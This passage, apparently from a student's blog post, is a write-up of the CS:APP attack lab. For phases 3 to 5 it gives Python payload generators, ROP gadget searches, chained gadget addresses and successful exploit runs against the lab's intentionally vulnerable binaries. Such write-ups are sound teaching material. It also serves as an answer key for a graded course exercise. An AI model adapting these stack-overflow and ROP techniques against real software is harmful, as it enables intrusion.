c3&#x27;</span>.split()</span><br><span class="line">code = <span class="string">&#x27; &#x27;</span>.join(codels)</span><br><span class="line"></span><br><span class="line">touch3address = <span class="string">&#x27;00000000004018fa&#x27;</span></span><br><span class="line">stackaddress = <span class="string">&#x27;&#123;:0&gt;16x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x5561dca0</span>-<span class="built_in">len</span>(codels))</span><br><span class="line">stingaddress = <span class="string">&#x27;&#123;:0&gt;16x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x5561dc78</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 00 server as \0 to terminate the string</span></span><br><span class="line">payload = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x28</span> - <span class="built_in">len</span>(codels) - <span class="built_in">len</span>(cookie))])</span><br><span class="line"></span><br><span class="line">touch3bytes = addressconvert(touch3address) </span><br><span class="line">stackbytes = addressconvert(stackaddress) </span><br><span class="line"></span><br><span class="line">f.write(cookiestr+ <span class="string">&#x27; &#x27;</span> + payload + <span class="string">&#x27; &#x27;</span> + code  + <span class="string">&#x27; &#x27;</span> + stackbytes + <span class="string">&#x27; &#x27;</span> + touch3bytes  )</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat stage3 | ./hex2raw &gt; exp3</span><br><span class="line">$ ./ctarget -q -i exp3</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br></pre></td></tr></table></figure>
+<h3 id="Phase-4-1"><a href="#Phase-4-1" class="headerlink" title="Phase 4"></a>Phase 4</h3><p>The machine code table is quiet useful in ROP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ grep dumpfarm.s -e <span class="string">&#x27;48 89 ..&#x27;</span></span><br><span class="line">   c:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  1a:	c7 07 48 89 c7 c7    	movl   <span class="variable">$0xc7c78948</span>,(%rdi)</span><br><span class="line">  2f:	c7 07 48 89 c7 90    	movl   <span class="variable">$0x90c78948</span>,(%rdi)</span><br><span class="line">  6f:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  84:	b8 48 89 e0 c1       	mov    <span class="variable">$0xc1e08948</span>,%eax</span><br><span class="line">  b3:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax</span><br><span class="line">  c6:	c7 07 48 89 e0 91    	movl   <span class="variable">$0x91e08948</span>,(%rdi)</span><br><span class="line"> 103:	c7 07 48 89 e0 c2    	movl   <span class="variable">$0xc2e08948</span>,(%rdi)</span><br><span class="line"> 117:	c7 07 48 89 e0 90    	movl   <span class="variable">$0x90e08948</span>,(%rdi)</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$  grep dumpfarm.s -e <span class="string">&#x27; 5. &#x27;</span></span><br><span class="line">  13:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  21:	c7 07 54 c2 58 92    	movl   <span class="variable">$0x9258c254</span>,(%rdi)</span><br><span class="line">  36:	b8 29 58 90 c3       	mov    <span class="variable">$0xc3905829</span>,%eax</span><br><span class="line">  47:	b8 5c 89 c2 90       	mov    <span class="variable">$0x90c2895c</span>,%eax</span><br></pre></td></tr></table></figure>
+<p>After some work, I find the following useful gadgets</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">36:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line"> c:	8d 87 48 89 c7 c3    	lea   -0x3c3876b8(%rdi),%eax</span><br><span class="line">58 90 c3</span><br><span class="line">pop %rax</span><br><span class="line">nop</span><br><span class="line">ret</span><br><span class="line">48 89 c7 c3</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>The exploit code</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addressconvert</span>(<span class="params">address:<span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join( [ address[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(address)-<span class="number">2</span> , -<span class="number">2</span> , -<span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;stage4&#x27;</span>, <span class="string">&#x27;wt+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;61&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x28</span>)])</span><br><span class="line"></span><br><span class="line">popraxaddress = <span class="string">&#x27;00000000004019cc&#x27;</span></span><br><span class="line">movraxrdiaddress = <span class="string">&#x27;00000000004019a2&#x27;</span></span><br><span class="line">touch2address = <span class="string">&#x27;00000000004017ec&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;00 00 00 00 59 b9 97 fa&#x27;</span>.split()[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">f.write( <span class="string">&#x27; &#x27;</span>.join([payload , addressconvert(popraxaddress) , cookie , addressconvert(movraxrdiaddress) , addressconvert(touch2address)]) )</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i stage4 &gt; exp4</span><br><span class="line">$ ./rtarget -q -i exp4</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br></pre></td></tr></table></figure>
+<h3 id="Phase-5-1"><a href="#Phase-5-1" class="headerlink" title="Phase 5"></a>Phase 5</h3><p><em>In order to pass the address of our cookie string, we need to leak the stack address</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">6f:	8d 87 41 48 89 e0    	lea   -0x1f76b7bf(%rdi),%eax</span><br><span class="line">6e:	c3                   	retq</span><br><span class="line">48 89 e0 c3</span><br><span class="line">movq %rsp,%rax</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<p>Also we need to do some calculation and data transmission</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">42:	48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line"></span><br><span class="line">7d:	8d 87 89 ce 90 90    lea -0x6f6f3177(%rdi),%eax</span><br><span class="line">89 ce 90 90 c3</span><br><span class="line">movl %ecx,%esi</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">d4:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax</span><br><span class="line">89 d1 08 db c3</span><br><span class="line">movl %edx,%ecx</span><br><span class="line">orb %bl,%bl</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">47:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax</span><br><span class="line">89 c2 90 c3</span><br><span class="line">movl %eax,%edx</span><br><span class="line">nop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">2f:	c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)</span><br><span class="line">48 89 c7 90 c3</span><br><span class="line">movq %rax , %rdi</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>So the ROP chain will be like:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># leak stack address to %rdi</span><br><span class="line">movq %rsp,%rax</span><br><span class="line">retq</span><br><span class="line">movq %rax , %rdi</span><br><span class="line">nop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line"># pop offset value into %rsi</span><br><span class="line">pop %rax</span><br><span class="line">nop</span><br><span class="line">ret</span><br><span class="line">movl %eax,%edx</span><br><span class="line">nop</span><br><span class="line">ret</span><br><span class="line">movl %edx,%ecx</span><br><span class="line">orb %bl,%bl</span><br><span class="line">ret</span><br><span class="line">movl %ecx,%esi</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line"># %rax &#x3D; %rdi + %rsi (stack address + offset &#x3D;&#x3D; cookie address)</span><br><span class="line">lea    (%rdi,%rsi,1),%rax</span><br><span class="line"></span><br><span class="line"># pass the address as argument</span><br><span class="line">movq %rax , %rdi</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>Notice that <code>movl</code> only operate on 32 bits data, the higher bits will be set to 0</p>
+<p>So we can only add value to <code>%rdi</code>, subtraction cannot be done.</p>
+<p>Hence we must put our cookie string after the <code>touch3address</code> rather than the beginning of the buffer.</p>
+<p>Exploit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addressconvert</span>(<span class="params">address:<span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join( [ address[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(address)-<span class="number">2</span> , -<span class="number">2</span> , -<span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;stage5&#x27;</span>, <span class="string">&#x27;wt+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&#x27;59b997fa&#x27;</span></span><br><span class="line">cookiestr = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> cookie] + [<span class="string">&#x27;00&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x28</span>)])</span><br><span class="line"></span><br><span class="line">movrsprax = <span class="string">&#x27;0000000000401a06&#x27;</span></span><br><span class="line">movraxrdi = <span class="string">&#x27;00000000004019c5&#x27;</span></span><br><span class="line">poprax = <span class="string">&#x27;00000000004019cc&#x27;</span></span><br><span class="line">moveaxedx = <span class="string">&#x27;00000000004019dd&#x27;</span></span><br><span class="line">movedxecx = <span class="string">&#x27;0000000000401a69&#x27;</span></span><br><span class="line">movecxesi = <span class="string">&#x27;0000000000401a13&#x27;</span></span><br><span class="line">lea = <span class="string">&#x27;00000000004019d6&#x27;</span></span><br><span class="line"></span><br><span class="line">touch3address = <span class="string">&#x27;00000000004018fa&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">&#x27;0000000000000048&#x27;</span> <span class="comment"># (0x8 * 9)</span></span><br><span class="line"></span><br><span class="line">f.write(<span class="string">&#x27; &#x27;</span>.join([</span><br><span class="line">    payload ,</span><br><span class="line"> addressconvert(movrsprax),</span><br><span class="line"> addressconvert(movraxrdi),</span><br><span class="line"> addressconvert(poprax),</span><br><span class="line"> addressconvert(offset),</span><br><span class="line"> addressconvert(moveaxedx),</span><br><span class="line"> addressconvert(movedxecx),</span><br><span class="line"> addressconvert(movecxesi),</span><br><span class="line"> addressconvert(lea),</span><br><span class="line"> addressconvert(movraxrdi),</span><br><span class="line"> addressconvert(touch3address),</span><br><span class="line">    cookiestr </span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i stage5 &gt; exp5</span><br><span class="line">$ ./rtarget -q -i exp5</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://rubbish-and-world.github.io/2021/09/13/CSAPP/attacklab/" data-id="cktmyu04o0004qpyqdyxnddrj" data-title="attacklab" class="article-share-link">Compartir</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/10/Network/principles/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Viejo</strong>
+      <div class="article-nav-title">principles</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categorías</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Cryptography/">Cryptography</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Data-Structure/">Data Structure</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Electronics/">Electronics</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hexo/">Hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Machine-Learning/">Machine Learning</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Machine-Learning/NTU/">NTU</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Machine-Learning/Stanford-CS229/">Stanford CS229</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Math/">Math</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Math/Discrete-Mathematics/">Discrete Mathematics</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Networking/">Networking</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Networking/Stanford-CS144/">Stanford CS144</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python-OG/">Python OG</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/csapp/">csapp</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/csapp/Stanford-CS144/">Stanford CS144</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/" rel="tag">game</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Nube de Tags</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/game/" style="font-size: 10px;">game</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archivos</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Posts recientes</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/09/13/CSAPP/attacklab/">attacklab</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/10/Network/principles/">principles</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/10/CSAPP/Ch6/">Ch6</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/09/Network/network-layer/">network layer</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/06/Network/Introduction/">Introduction</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 rubbish<br>
+      Construido por <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
